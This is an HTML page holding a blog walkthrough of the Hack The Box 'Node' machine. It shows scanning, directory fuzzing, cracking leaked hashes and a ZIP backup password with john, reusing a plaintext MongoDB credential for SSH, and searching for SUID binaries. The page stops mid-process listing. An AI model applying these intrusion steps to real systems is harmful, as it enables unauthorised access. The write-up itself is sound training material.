<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Node | PwndSide</title><meta name=keywords content="privesc,web,linux,buffer overflow"><meta name=description content="Linux machine which has a website with a password leak. We gain access to the user thanks to a credentials leak. We privesc thanks to a mongoDB javascript and SUID binary exploitation."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/node-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/node-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Node"><meta property="og:description" content="Linux machine which has a website with a password leak. We gain access to the user thanks to a credentials leak. We privesc thanks to a mongoDB javascript and SUID binary exploitation."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-22T12:14:24+02:00"><meta property="article:modified_time" content="2023-08-22T12:14:24+02:00"><meta property="article:tag" content="Privesc"><meta property="article:tag" content="Web"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Buffer Overflow"><meta property="og:image" content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:title content="Node"><meta name=twitter:description content="Linux machine which has a website with a password leak. We gain access to the user thanks to a credentials leak. We privesc thanks to a mongoDB javascript and SUID binary exploitation."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Node","item":"http://localhost:1313/posts/node-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Node","name":"Node","description":"Linux machine which has a website with a password leak. We gain access to the user thanks to a credentials leak. We privesc thanks to a mongoDB javascript and SUID binary exploitation.","keywords":["privesc","web","linux","buffer overflow"],"articleBody":"Room Information Room name: Node Difficulty level: Medium Room link: https://app.hackthebox.com/machines/Node Tools Used nmap john mongoDB ltrace Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 35 │ PORT STATE SERVICE REASON VERSION 36 │ 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; p │ rotocol 2.0) 37 │ | ssh-hostkey: 38 │ | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA) 39 │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmE │ gVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+ │ O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRn │ w28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEV │ L5tYGb 40 │ | 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA) 41 │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5 │ D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU= 42 │ | 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519) 43 │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y 44 │ 3000/tcp open hadoop-datanode syn-ack ttl 63 Apache Hadoop 45 │ | hadoop-tasktracker-info: 46 │ |_ Logs: /login 47 │ | http-methods: 48 │ |_ Supported Methods: GET HEAD POST OPTIONS 49 │ |_http-title: MyPlace 50 │ |_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF 51 │ | hadoop-datanode-info: 52 │ |_ Logs: /login 53 │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We have two open ports one with ssh and http web server at port 3000.\nEnumeration As the only point to start the enumeration step we are going to enumerate the web page.\nWe are in front a type of social network and we can see some of the users which are registered in.\nBy accessing on any users which are shown by the website we can see that the page redirects us to http://10.10.10.58:3000/profiles/[user] .\nI tried to change the link to http://10.10.10.58:3000/profiles/admin and http://10.10.10.58:3000/profiles/root but no one seems to be leaked.\nIf we return at the home page we can see a login button which redirects you to a login form.\nI tried a common/default password and a basic SQLi without succeed. As we know the server is running nodeJS so it’s so probable that is running with mongoDB so I tried a basic noSQLi too but none returned anything interesting.\nPerfect, we have some info but it’s not pretty enough we need something else so let’s focus now on fuzzing.\nffuf -u http://10.10.10.43/FUZZ -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -c -o fuzz | tee fuzz.save 1 │ [Status: 301, Size: 173, Words: 7, Lines: 10, Duration: 157ms] 2 │ | URL | http://10.10.10.58:3000/uploads 3 │ | --\u003e | /uploads/ 4 │ * FUZZ: uploads 5 │ 6 │ [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 104ms] 7 │ | URL | http://10.10.10.58:3000/assets 8 │ | --\u003e | /assets/ 9 │ * FUZZ: assets 10 │ 11 │ [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 130ms] 12 │ | URL | http://10.10.10.58:3000/vendor 13 │ | --\u003e | /vendor/ 14 │ * FUZZ: vendor I tried to access to the three directories but all of them redirects us to the home page.\nExploiting After hours of trying stuff, I discovered a directory which has not been fuzzed, by inspecting the page.\nThere is an api running at the background\nWhen we access to the url we can see that there are the same users as before and an admin account with hashed passwords. I cracked them more efficiently thanks to hashes.com\nWe are able to crack three hashes\nmyP14ceAdm1nAcc0uNT : manchester\ntom : spongebob\nmark : snowflake\nNow, let’s see if the admin credentials works on the login form seen before.\nWe are in and we only are able to download a backup of something.\nSeems to be encoded on base64 so let’s decode it.\ncat myplace.backup | base64 -d \u003e myplace Awesome, we have a ZIP archive but when I try to unzip it seems to be locked with password.\nMaybe zip2john helps us in this situation\nzip2john myplace \u003e zip_hash.txt john --wordlist=~/Documents/wordlists/rockyou.txt zip_hash.txt myplace:magicword::myplace:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/serve-static/README.md, var/www/myplace/package-lock.json:myplace 1 password hash cracked, 0 left We found a password let’s unzip the compressed file\nLooks like the backup of the website\nInside of the app.js file we can find a mongoDB credentials in plain text for mark, we can try to connect as mark via ssh\nconst url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT\u0026authSource=myplace'; Gaining an Initial Foothold We get access to an user, let search the user’s flag.\nAfter looking at mark’s home directory, we don’t find any flag.\nWith find we can observe that the flag is at tom’s home directory but we don’t have permissions to access to this folder (Privesc is required).\nEscalating Privilege Let’s elevate privileges.\nFirst let’s take a look if the current user has any sudo privileges\nWe don’t have any sudo privileges so let’s see if there is some SUID binary which helps us privesc.\nfind \\-perm -4000 -user root 2\u003e/dev/null ./usr/lib/eject/dmcrypt-get-device ./usr/lib/snapd/snap-confine ./usr/lib/dbus-1.0/dbus-daemon-launch-helper ./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic ./usr/lib/openssh/ssh-keysign ./usr/lib/policykit-1/polkit-agent-helper-1 ./usr/local/bin/backup ./usr/bin/chfn ./usr/bin/gpasswd ./usr/bin/newgidmap ./usr/bin/chsh ./usr/bin/sudo ./usr/bin/pkexec ./usr/bin/newgrp ./usr/bin/passwd ./usr/bin/newuidmap ./bin/ping ./bin/umount ./bin/fusermount ./bin/ping6 ./bin/ntfs-3g ./bin/su ./bin/mount ./usr/local/bin/backup looks pretty interesting\nThe only ones can execute it are root and the users which belong to the admin’s group.\nTaking a look of the tom’s groups we can see that belong to admin’s group\nThe thing is that we need to get access to tom’s account in order to run this SUID binary.\nLet’s take a look at the processes.\nps -faux root 1 1.9 0.7 37892 6000 ? Ss 22:30 0:02 /sbin/init root 455 0.0 0.3 28032 2840 ? Ss 22:30 0:00 /lib/systemd/systemd-journald root 511 0.0 0.4 102968 3760 ? Ss 22:30 0:00 /sbin/lvmetad -f root 527 0.0 0.4 44312 3764 ? Ss 22:30 0:00 /lib/systemd/systemd-udevd systemd+ 889 0.0 0.3 100324 2508 ? Ssl 22:30 0:00 /lib/systemd/systemd-timesyncd root 1074 0.0 0.4 29008 3052 ? Ss 22:30 0:00 /usr/sbin/cron -f syslog 1075 0.0 0.4 256400 3384 ? Ssl 22:30 0:00 /usr/sbin/rsyslogd -n root 1076 0.0 0.1 4400 1264 ? Ss 22:30 0:00 /usr/sbin/acpid root 1080 0.0 0.4 28548 3088 ? Ss 22:30 0:00 /lib/systemd/systemd-logind root 1088 0.0 0.8 275892 6168 ? Ssl 22:30 0:00 /usr/lib/accountsservice/accounts-daem root 1093 0.5 1.3 192268 10200 ? Ssl 22:30 0:00 /usr/bin/vmtoolsd message+ 1100 0.0 0.5 42904 3792 ? Ss 22:30 0:00 /usr/bin/dbus-daemon --system --addres root 1111 0.0 0.1 95368 1388 ? Ssl 22:30 0:00 /usr/bin/lxcfs /var/lib/lxcfs/ daemon 1113 0.0 0.2 26044 2192 ? Ss 22:30 0:00 /usr/sbin/atd -f root 1118 0.0 2.7 193596 21164 ? S","wordCount":"2153","inLanguage":"en","image":"http://localhost:1313/%3Cimage%20path/url%3E","datePublished":"2023-08-22T12:14:24+02:00","dateModified":"2023-08-22T12:14:24+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/node-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="PwndSide (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=http://localhost:1313/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=http://localhost:1313/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Node</h1><div class=post-description>Linux machine which has a website with a password leak. We gain access to the user thanks to a credentials leak. We privesc thanks to a mongoDB javascript and SUID binary exploitation.</div><div class=post-meta><span title='2023-08-22 12:14:24 +0200 CEST'>August 22, 2023</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2153 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/node-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Node</li><li>Difficulty level: Medium</li><li>Room link: <a href=https://app.hackthebox.com/machines/Node>https://app.hackthebox.com/machines/Node</a></li></ul><p><img alt=/HTB/node-icon.png loading=lazy src=/HTB/node-icon.png></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li><li>john</li><li>mongoDB</li><li>ltrace</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>  <span class=m>35</span>   │ PORT     STATE SERVICE         REASON         VERSION
</span></span><span class=line><span class=cl>  <span class=m>36</span>   │ 22/tcp   open  ssh             syn-ack ttl <span class=m>63</span> OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> p
</span></span><span class=line><span class=cl>       │ rotocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>37</span>   │ <span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl>  <span class=m>38</span>   │ <span class=p>|</span>   <span class=m>2048</span> dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>39</span>   │ <span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmE
</span></span><span class=line><span class=cl>       │ gVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+
</span></span><span class=line><span class=cl>       │ O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRn
</span></span><span class=line><span class=cl>       │ w28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEV
</span></span><span class=line><span class=cl>       │ L5tYGb
</span></span><span class=line><span class=cl>  <span class=m>40</span>   │ <span class=p>|</span>   <span class=m>256</span> 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>41</span>   │ <span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5
</span></span><span class=line><span class=cl>       │ D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU<span class=o>=</span>
</span></span><span class=line><span class=cl>  <span class=m>42</span>   │ <span class=p>|</span>   <span class=m>256</span> d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>43</span>   │ <span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
</span></span><span class=line><span class=cl>  <span class=m>44</span>   │ 3000/tcp open  hadoop-datanode syn-ack ttl <span class=m>63</span> Apache Hadoop
</span></span><span class=line><span class=cl>  <span class=m>45</span>   │ <span class=p>|</span> hadoop-tasktracker-info:
</span></span><span class=line><span class=cl>  <span class=m>46</span>   │ <span class=p>|</span>_  Logs: /login
</span></span><span class=line><span class=cl>  <span class=m>47</span>   │ <span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl>  <span class=m>48</span>   │ <span class=p>|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>  <span class=m>49</span>   │ <span class=p>|</span>_http-title: MyPlace
</span></span><span class=line><span class=cl>  <span class=m>50</span>   │ <span class=p>|</span>_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
</span></span><span class=line><span class=cl>  <span class=m>51</span>   │ <span class=p>|</span> hadoop-datanode-info:
</span></span><span class=line><span class=cl>  <span class=m>52</span>   │ <span class=p>|</span>_  Logs: /login
</span></span><span class=line><span class=cl>  <span class=m>53</span>   │ Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>We have two open ports one with <strong>ssh</strong> and <strong>http</strong> web server at <strong>port 3000</strong>.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>As the only point to start the enumeration step we are going to enumerate the web page.</p><p><img alt=/HTB/node-1.png loading=lazy src=/HTB/node-1.png></p><p>We are in front a type of social network and we can see some of the users which are registered in.</p><p><img alt=/HTB/node-2.png loading=lazy src=/HTB/node-2.png></p><p>By accessing on any users which are shown by the website we can see that the page redirects us to <code>http://10.10.10.58:3000/profiles/[user]</code> .</p><p>I tried to change the link to <code>http://10.10.10.58:3000/profiles/admin</code> and <code>http://10.10.10.58:3000/profiles/root</code> but no one seems to be leaked.</p><p><img alt=/HTB/node-3.png loading=lazy src=/HTB/node-3.png></p><p>If we return at the home page we can see a login button which redirects you to a login form.</p><p><img alt=/HTB/node-27.png loading=lazy src=/HTB/node-27.png></p><p>I tried a common/default password and a basic SQLi without succeed. As we know the server is running nodeJS so it’s so probable that is running with mongoDB so I tried a basic noSQLi too but none returned anything interesting.</p><p>Perfect, we have some info but it’s not pretty enough we need something else so let’s focus now on fuzzing.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u http://10.10.10.43/FUZZ -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span class=m>200</span> -c -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>   <span class=m>1</span>   │ <span class=o>[</span>Status: 301, Size: 173, Words: 7, Lines: 10, Duration: 157ms<span class=o>]</span>
</span></span><span class=line><span class=cl>   <span class=m>2</span>   │ <span class=p>|</span> URL <span class=p>|</span> http://10.10.10.58:3000/uploads
</span></span><span class=line><span class=cl>   <span class=m>3</span>   │ <span class=p>|</span> --&gt; <span class=p>|</span> /uploads/
</span></span><span class=line><span class=cl>   <span class=m>4</span>   │     * FUZZ: uploads
</span></span><span class=line><span class=cl>   <span class=m>5</span>   │
</span></span><span class=line><span class=cl>   <span class=m>6</span>   │ <span class=o>[</span>Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 104ms<span class=o>]</span>
</span></span><span class=line><span class=cl>   <span class=m>7</span>   │ <span class=p>|</span> URL <span class=p>|</span> http://10.10.10.58:3000/assets
</span></span><span class=line><span class=cl>   <span class=m>8</span>   │ <span class=p>|</span> --&gt; <span class=p>|</span> /assets/
</span></span><span class=line><span class=cl>   <span class=m>9</span>   │     * FUZZ: assets
</span></span><span class=line><span class=cl>  <span class=m>10</span>   │
</span></span><span class=line><span class=cl>  <span class=m>11</span>   │ <span class=o>[</span>Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 130ms<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>12</span>   │ <span class=p>|</span> URL <span class=p>|</span> http://10.10.10.58:3000/vendor
</span></span><span class=line><span class=cl>  <span class=m>13</span>   │ <span class=p>|</span> --&gt; <span class=p>|</span> /vendor/
</span></span><span class=line><span class=cl>  <span class=m>14</span>   │     * FUZZ: vendor
</span></span></code></pre></div><p>I tried to access to the three directories but all of them redirects us to the home page.</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>After hours of trying stuff, I discovered a directory which has not been fuzzed, by inspecting the page.</p><p><img alt=/HTB/node-4.png loading=lazy src=/HTB/node-4.png></p><p>There is an api running at the background</p><p><img alt=/HTB/node-5.png loading=lazy src=/HTB/node-5.png></p><p>When we access to the url we can see that there are the same users as before and an admin account with hashed passwords. I cracked them more efficiently thanks to <a href=http://hashes.com>hashes.com</a></p><p><img alt=/HTB/node-6.png loading=lazy src=/HTB/node-6.png></p><p>We are able to crack three hashes</p><p><strong>myP14ceAdm1nAcc0uNT</strong> : manchester</p><p><strong>tom</strong> : spongebob</p><p><strong>mark</strong> : snowflake</p><p>Now, let’s see if the admin credentials works on the login form seen before.</p><p><img alt=/HTB/node-7.png loading=lazy src=/HTB/node-7.png></p><p>We are in and we only are able to download a backup of something.</p><p><img alt=/HTB/node-8.png loading=lazy src=/HTB/node-8.png></p><p><img alt=/HTB/node-9.png loading=lazy src=/HTB/node-9.png></p><p>Seems to be encoded on base64 so let’s decode it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat myplace.backup <span class=p>|</span> base64 -d &gt; myplace
</span></span></code></pre></div><p><img alt=/HTB/node-10.png loading=lazy src=/HTB/node-10.png></p><p>Awesome, we have a ZIP archive but when I try to unzip it seems to be locked with password.</p><p>Maybe zip2john helps us in this situation</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>zip2john myplace &gt; zip_hash.txt
</span></span><span class=line><span class=cl>john --wordlist<span class=o>=</span>~/Documents/wordlists/rockyou.txt  zip_hash.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>myplace:magicword::myplace:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/serve-static/README.md, var/www/myplace/package-lock.json:myplace
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>1</span> password <span class=nb>hash</span> cracked, <span class=m>0</span> left
</span></span></code></pre></div><p>We found a password let’s unzip the compressed file</p><p><img alt=/HTB/node-11.png loading=lazy src=/HTB/node-11.png></p><p>Looks like the backup of the website</p><p>Inside of the app.js file we can find a mongoDB credentials in plain text for mark, we can try to connect as mark via ssh</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>const <span class=nv>url</span>         <span class=o>=</span> <span class=s1>&#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;</span><span class=p>;</span>
</span></span></code></pre></div><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img alt=/HTB/node-12.png loading=lazy src=/HTB/node-12.png></p><p>We get access to an user, let search the user’s flag.</p><p>After looking at mark’s home directory, we don’t find any flag.</p><p><img alt=/HTB/node-13.png loading=lazy src=/HTB/node-13.png></p><p>With find we can observe that the flag is at tom’s home directory but we don’t have permissions to access to this folder (Privesc is required).</p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>Let’s elevate privileges.</p><p>First let’s take a look if the current user has any sudo privileges</p><p><img alt=/HTB/node-26.png loading=lazy src=/HTB/node-26.png></p><p>We don’t have any sudo privileges so let’s see if there is some SUID binary which helps us privesc.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find <span class=se>\-</span>perm -4000 -user root 2&gt;/dev/null
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./usr/lib/eject/dmcrypt-get-device
</span></span><span class=line><span class=cl>./usr/lib/snapd/snap-confine
</span></span><span class=line><span class=cl>./usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span class=line><span class=cl>./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
</span></span><span class=line><span class=cl>./usr/lib/openssh/ssh-keysign
</span></span><span class=line><span class=cl>./usr/lib/policykit-1/polkit-agent-helper-1
</span></span><span class=line><span class=cl>./usr/local/bin/backup
</span></span><span class=line><span class=cl>./usr/bin/chfn
</span></span><span class=line><span class=cl>./usr/bin/gpasswd
</span></span><span class=line><span class=cl>./usr/bin/newgidmap
</span></span><span class=line><span class=cl>./usr/bin/chsh
</span></span><span class=line><span class=cl>./usr/bin/sudo
</span></span><span class=line><span class=cl>./usr/bin/pkexec
</span></span><span class=line><span class=cl>./usr/bin/newgrp
</span></span><span class=line><span class=cl>./usr/bin/passwd
</span></span><span class=line><span class=cl>./usr/bin/newuidmap
</span></span><span class=line><span class=cl>./bin/ping
</span></span><span class=line><span class=cl>./bin/umount
</span></span><span class=line><span class=cl>./bin/fusermount
</span></span><span class=line><span class=cl>./bin/ping6
</span></span><span class=line><span class=cl>./bin/ntfs-3g
</span></span><span class=line><span class=cl>./bin/su
</span></span><span class=line><span class=cl>./bin/mount
</span></span></code></pre></div><p><code>./usr/local/bin/backup</code> looks pretty interesting</p><p><img alt=/HTB/node-14.png loading=lazy src=/HTB/node-14.png></p><p>The only ones can execute it are root and the users which belong to the admin’s group.</p><p>Taking a look of the tom’s groups we can see that belong to admin’s group</p><p><img alt=/HTB/node-15.png loading=lazy src=/HTB/node-15.png></p><p>The thing is that we need to get access to tom’s account in order to run this SUID binary.</p><p>Let’s take a look at the processes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ps -faux
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root         <span class=m>1</span>  1.9  0.7  <span class=m>37892</span>  <span class=m>6000</span> ?        Ss   22:30   0:02 /sbin/init
</span></span><span class=line><span class=cl>root       <span class=m>455</span>  0.0  0.3  <span class=m>28032</span>  <span class=m>2840</span> ?        Ss   22:30   0:00 /lib/systemd/systemd-journald
</span></span><span class=line><span class=cl>root       <span class=m>511</span>  0.0  0.4 <span class=m>102968</span>  <span class=m>3760</span> ?        Ss   22:30   0:00 /sbin/lvmetad -f
</span></span><span class=line><span class=cl>root       <span class=m>527</span>  0.0  0.4  <span class=m>44312</span>  <span class=m>3764</span> ?        Ss   22:30   0:00 /lib/systemd/systemd-udevd
</span></span><span class=line><span class=cl>systemd+   <span class=m>889</span>  0.0  0.3 <span class=m>100324</span>  <span class=m>2508</span> ?        Ssl  22:30   0:00 /lib/systemd/systemd-timesyncd
</span></span><span class=line><span class=cl>root      <span class=m>1074</span>  0.0  0.4  <span class=m>29008</span>  <span class=m>3052</span> ?        Ss   22:30   0:00 /usr/sbin/cron -f
